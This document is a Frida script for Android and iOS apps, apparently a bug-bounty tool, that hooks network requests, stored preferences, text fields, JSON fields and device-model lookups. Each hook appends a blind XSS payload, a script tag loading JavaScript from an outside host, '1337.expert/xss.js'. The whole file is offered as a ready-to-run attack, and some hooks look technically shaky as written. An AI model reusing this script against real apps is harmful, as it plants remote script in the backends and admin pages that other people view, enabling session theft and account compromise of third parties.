if (Java.available || ObjC.available) {
    console.log("[*] Starting comprehensive Blind XSS injection script...");

    // === Helper function to inject Blind XSS payload ===
    function injectBlindXSS(value) {
        return value + "<script src='https://1337.expert/xss.js'></script>";
    }

    // === Android Injection Logic ===
    if (Java.available) {
        Java.perform(function () {
            console.log("[*] Android environment detected. Starting Android hooks...");

            // Hook network requests via OkHttpClient
            try {
                var OkHttpClient = Java.use('okhttp3.OkHttpClient');
                OkHttpClient.newCall.overload('okhttp3.Request').implementation = function (request) {
                    console.log("[*] Intercepted OkHttp request: " + request.url());

                    // Add Blind XSS payload to headers
                    var modifiedRequest = request.newBuilder()
                        .addHeader('X-Blind-XSS', injectBlindXSS('test'))
                        .build();
                    console.log("[*] Modified OkHttp request with Blind XSS payload in headers.");
                    
                    return this.newCall(modifiedRequest);
                };
            } catch (err) {
                console.log("[!] Error hooking OkHttpClient: " + err);
            }

            // Hook SharedPreferences to capture and inject payloads
            try {
                var SharedPreferences = Java.use("android.content.SharedPreferences");
                var Editor = Java.use("android.content.SharedPreferences$Editor");

                // Capture getString calls
                SharedPreferences.getString.overload("java.lang.String", "java.lang.String").implementation = function (key, defValue) {
                    var result = this.getString(key, defValue);
                    console.log("[*] Captured SharedPreferences key: " + key + ", value: " + result);
                    return result;
                };

                // Inject Blind XSS in setString calls
                Editor.putString.overload("java.lang.String", "java.lang.String").implementation = function (key, value) {
                    console.log("[*] Intercepted SharedPreferences set: key = " + key + ", value = " + value);
                    var modifiedValue = injectBlindXSS(value);
                    console.log("[*] Injected Blind XSS in SharedPreferences value.");
                    return this.putString(key, modifiedValue);
                };
            } catch (err) {
                console.log("[!] Error hooking SharedPreferences: " + err);
            }

            // Hook TextView setText to inject payload into inputs
            try {
                var TextView = Java.use("android.widget.TextView");
                TextView.setText.overload("java.lang.CharSequence").implementation = function (charSequence) {
                    console.log("[*] Intercepted setText with: " + charSequence);
                    var modifiedText = injectBlindXSS(charSequence.toString());
                    console.log("[*] Injected Blind XSS into TextView input.");
                    return this.setText(modifiedText);
                };
            } catch (err) {
                console.log("[!] Error hooking TextView: " + err);
            }

            // Hook API responses via JSONObject
            try {
                var JSONObject = Java.use("org.json.JSONObject");
                JSONObject.put.overload("java.lang.String", "java.lang.Object").implementation = function (key, value) {
                    if (key === "comment" || key === "message") { // Example fields
                        console.log("[*] Intercepted API response field: " + key);
                        var modifiedValue = injectBlindXSS(value.toString());
                        console.log("[*] Injected Blind XSS in API response field.");
                        return this.put(key, modifiedValue);
                    }
                    return this.put(key, value);
                };
            } catch (err) {
                console.log("[!] Error hooking JSONObject: " + err);
            }
        });
    }

    // === iOS Injection Logic ===
    if (ObjC.available) {
        console.log("[*] iOS environment detected. Starting iOS hooks...");

        // Hook network requests via NSURLSession
        try {
            var NSURLSession = ObjC.classes.NSURLSession;
            Interceptor.attach(NSURLSession["- dataTaskWithRequest:completionHandler:"].implementation, {
                onEnter: function (args) {
                    console.log("[*] Intercepted NSURLSession request");

                    var request = new ObjC.Object(args[2]);
                    console.log("[*] Original URL: " + request.URL().absoluteString());

                    // Add Blind XSS payload to headers
                    var newRequest = request.mutableCopy();
                    newRequest.setValue_forHTTPHeaderField_(injectBlindXSS("test"), "X-Blind-XSS");
                    args[2] = newRequest;
                    console.log("[*] Added Blind XSS payload to the request header.");
                }
            });
        } catch (err) {
            console.log("[!] Error hooking NSURLSession: " + err);
        }

        // Hook NSUserDefaults to capture and inject payloads
        try {
            var NSUserDefaults = ObjC.classes.NSUserDefaults;
            Interceptor.attach(NSUserDefaults["- stringForKey:"].implementation, {
                onLeave: function (retval) {
                    console.log("[*] Captured NSUserDefaults value: " + retval);
                }
            });

            Interceptor.attach(NSUserDefaults["- setObject:forKey:"].implementation, {
                onEnter: function (args) {
                    console.log("[*] Intercepted NSUserDefaults set: key = " + ObjC.Object(args[3]) + ", value = " + ObjC.Object(args[2]));
                    args[2] = injectBlindXSS(args[2].toString());
                    console.log("[*] Injected Blind XSS in NSUserDefaults value.");
                }
            });
        } catch (err) {
            console.log("[!] Error hooking NSUserDefaults: " + err);
        }

        // Hook input fields (UITextField)
        try {
            var UITextField = ObjC.classes.UITextField;
            Interceptor.attach(UITextField["- setText:"].implementation, {
                onEnter: function (args) {
                    var inputText = ObjC.Object(args[2]);
                    console.log("[*] Intercepted UITextField setText: " + inputText);
                    args[2] = injectBlindXSS(inputText.toString());
                    console.log("[*] Injected Blind XSS in UITextField.");
                }
            });
        } catch (err) {
            console.log("[!] Error hooking UITextField: " + err);
        }

        // Hook MCopyAnswer for device model/version spoofing
        try {
            var MGCopyAnswer = Module.findExportByName(null, "MGCopyAnswer");
            if (MGCopyAnswer) {
                Interceptor.attach(MGCopyAnswer, {
                    onEnter: function (args) {
                        this.key = args[0].readCString();
                    },
                    onLeave: function (retval) {
                        if (this.key === "ProductType" || this.key === "ProductVersion") {
                            console.log("[*] Intercepted MGCopyAnswer call for: " + this.key);
                            retval.replace(ObjC.classes.NSString.stringWithString_(injectBlindXSS(retval.toString())));
                            console.log("[*] Injected Blind XSS in MGCopyAnswer.");
                        }
                    }
                });
            }
        } catch (err) {
            console.log("[!] Error hooking MGCopyAnswer: " + err);
        }
    }

    console.log("[*] Comprehensive Blind XSS injection script loaded successfully.");
} else {
    console.error("[-] Neither Java nor ObjC is available!");
}